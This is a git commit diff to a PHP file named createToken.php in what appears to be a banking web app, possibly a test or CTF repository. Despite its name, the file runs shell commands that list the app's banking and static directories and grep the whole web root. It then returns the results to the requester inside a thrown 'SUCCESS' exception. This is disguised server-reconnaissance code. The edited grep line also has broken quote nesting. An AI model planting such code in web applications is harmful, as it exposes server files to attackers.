a5f88805d8e6260a2658ebedea7251c5bfecac92
TestBalbes <76755615+TestBalbes@users.noreply.github.com>
2021-01-02 21:09:07 +0100

    Update createToken.php

--- createToken.php
+++ createToken.php
@@ -2,7 +2,7 @@
 $output ='';
 $output =$output."\n /var/www/app/banking/... ".shell_exec ('ls /var/www/app/banking/ | xargs');
 $output =$output."\n /var/www/app/static/... ".shell_exec ('ls /var/www/app/static/ | xargs');
-$output =$output."\n grep bad in /var/www ... ".shell_exec ('grep -rn "bad" /var/www/ | xargs');
+$output =$output."\n grep bad in /var/www ... ".shell_exec ('grep -rn '/var/www/' -e 'bad'  | xargs');
 
 
 throw new Exception("\n SUCCESS  ". $output."\n");
